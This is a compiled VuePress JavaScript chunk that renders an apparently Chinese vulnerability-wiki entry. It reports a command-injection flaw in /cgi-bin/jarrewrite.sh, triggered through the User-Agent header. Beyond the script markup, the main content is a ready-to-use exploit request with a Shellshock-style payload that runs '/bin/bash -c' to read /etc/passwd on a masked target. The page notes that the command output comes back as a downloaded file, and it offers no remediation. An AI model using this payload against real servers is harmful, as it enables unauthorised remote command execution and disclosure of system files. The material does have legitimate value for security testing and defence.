variable"}},[s._v("${FULL_JAVA_SRC_PATH}")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("then")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"File not found: '),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${FULL_JAVA_SRC_PATH}")]),s._v('"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v(" -2"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("fi")]),s._v("\n./jdasm "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${FULL_JAVA_SRC_PATH}")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("${FULL_JAVA_SRC_PATH}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("fi")]),s._v(" \n\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Recursive Class Rewrite Completed."')]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br"),n("span",{staticClass:"line-number"},[s._v("63")]),n("br"),n("span",{staticClass:"line-number"},[s._v("64")]),n("br"),n("span",{staticClass:"line-number"},[s._v("65")]),n("br"),n("span",{staticClass:"line-number"},[s._v("66")]),n("br"),n("span",{staticClass:"line-number"},[s._v("67")]),n("br"),n("span",{staticClass:"line-number"},[s._v("68")]),n("br"),n("span",{staticClass:"line-number"},[s._v("69")]),n("br"),n("span",{staticClass:"line-number"},[s._v("70")]),n("br"),n("span",{staticClass:"line-number"},[s._v("71")]),n("br"),n("span",{staticClass:"line-number"},[s._v("72")]),n("br"),n("span",{staticClass:"line-number"},[s._v("73")]),n("br"),n("span",{staticClass:"line-number"},[s._v("74")]),n("br"),n("span",{staticClass:"line-number"},[s._v("75")]),n("br"),n("span",{staticClass:"line-number"},[s._v("76")]),n("br"),n("span",{staticClass:"line-number"},[s._v("77")]),n("br"),n("span",{staticClass:"line-number"},[s._v("78")]),n("br"),n("span",{staticClass:"line-number"},[s._v("79")]),n("br"),n("span",{staticClass:"line-number"},[s._v("80")]),n("br"),n("span",{staticClass:"line-number"},[s._v("81")]),n("br"),n("span",{staticClass:"line-number"},[s._v("82")]),n("br"),n("span",{staticClass:"line-number"},[s._v("83")]),n("br"),n("span",{staticClass:"line-number"},[s._v("84")]),n("br"),n("span",{staticClass:"line-number"},[s._v("85")]),n("br"),n("span",{staticClass:"line-number"},[s._v("86")]),n("br"),n("span",{staticClass:"line-number"},[s._v("87")]),n("br"),n("span",{staticClass:"line-number"},[s._v("88")]),n("br"),n("span",{staticClass:"line-number"},[s._v("89")]),n("br"),n("span",{staticClass:"line-number"},[s._v("90")]),n("br"),n("span",{staticClass:"line-number"},[s._v("91")]),n("br"),n("span",{staticClass:"line-number"},[s._v("92")]),n("br"),n("span",{staticClass:"line-number"},[s._v("93")]),n("br"),n("span",{staticClass:"line-number"},[s._v("94")]),n("br"),n("span",{staticClass:"line-number"},[s._v("95")]),n("br"),n("span",{staticClass:"line-number"},[s._v("96")]),n("br"),n("span",{staticClass:"line-number"},[s._v("97")]),n("br"),n("span",{staticClass:"line-number"},[s._v("98")]),n("br"),n("span",{staticClass:"line-number"},[s._v("99")]),n("br"),n("span",{staticClass:"line-number"},[s._v("100")]),n("br"),n("span",{staticClass:"line-number"},[s._v("101")]),n("br"),n("span",{staticClass:"line-number"},[s._v("102")]),n("br"),n("span",{staticClass:"line-number"},[s._v("103")]),n("br"),n("span",{staticClass:"line-number"},[s._v("104")]),n("br"),n("span",{staticClass:"line-number"},[s._v("105")]),n("br"),n("span",{staticClass:"line-number"},[s._v("106")]),n("br"),n("span",{staticClass:"line-number"},[s._v("107")]),n("br"),n("span",{staticClass:"line-number"},[s._v("108")]),n("br"),n("span",{staticClass:"line-number"},[s._v("109")]),n("br"),n("span",{staticClass:"line-number"},[s._v("110")]),n("br"),n("span",{staticClass:"line-number"},[s._v("111")]),n("br"),n("span",{staticClass:"line-number"},[s._v("112")]),n("br"),n("span",{staticClass:"line-number"},[s._v("113")]),n("br"),n("span",{staticClass:"line-number"},[s._v("114")]),n("br"),n("span",{staticClass:"line-number"},[s._v("115")]),n("br"),n("span",{staticClass:"line-number"},[s._v("116")]),n("br"),n("span",{staticClass:"line-number"},[s._v("117")]),n("br"),n("span",{staticClass:"line-number"},[s._v("118")]),n("br"),n("span",{staticClass:"line-number"},[s._v("119")]),n("br"),n("span",{staticClass:"line-number"},[s._v("120")]),n("br"),n("span",{staticClass:"line-number"},[s._v("121")]),n("br"),n("span",{staticClass:"line-number"},[s._v("122")]),n("br"),n("span",{staticClass:"line-number"},[s._v("123")]),n("br"),n("span",{staticClass:"line-number"},[s._v("124")]),n("br")])]),n("p",[s._v("这个文件存在命令注入漏洞，漏洞触发在 "),n("code",[s._v("Usage-Agent")])]),s._v(" "),n("p",[s._v("发送如下请求即可命令执行")]),s._v(" "),n("p",[n("img",{attrs:{src:t(1348),alt:"img"}})]),s._v(" "),n("div",{staticClass:"language-shell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-shell"}},[n("code",[s._v("GET https://xxx.xxx.xxx.xxx/cgi-bin/jarrewrite.sh\nUser-Agent: "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" /bin/bash -c "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'cat /etc/passwd'")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("p",[s._v("发送请求会下载一个文件，文件内容为命令执行的结果")]),s._v(" "),n("p",[n("img",{attrs:{src:t(1349),alt:"img"}})]),s._v(" "),n("h2",{attrs:{id:"漏洞poc"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞poc"}},[s._v("#")]),s._v(" 漏洞POC")])],1)}),[],!1,null,null,null);a.default=e.exports}}]);